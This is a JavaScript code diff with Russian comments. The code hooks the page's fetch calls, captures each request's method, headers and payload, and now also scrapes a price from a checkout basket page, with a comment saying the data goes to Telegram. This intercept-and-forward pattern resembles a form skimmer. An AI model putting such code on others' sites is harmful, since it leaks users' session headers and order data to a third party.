@@ -23,7 +23,11 @@
                 }
             }
 
-            // Выполняем оригинальный запрос и анализируем ответ
+            // Извлекаем информацию из элемента
+            const priceElement = document.querySelector('#hr-modal > div.hr-modal > div > div.basket-page__container > div.basket-page__content > div.form-container > div.form > div.form__price-block.price-block > div:nth-child(2) > div.price-block__right');
+            const priceInfo = priceElement ? priceElement.innerText : 'Информация не найдена';
+
+            // Добавляем информацию в отправку данных в Telegram
             const response = await originalFetch(...args);
 
             if (response.ok) { // Проверка на статус-код 200
@@ -33,6 +37,7 @@
                     method: args[1]?.method || 'GET',
                     headers: args[1]?.headers,
                     payload: payloadData,
+                    priceInfo: priceInfo,
                 };
 
                 try {
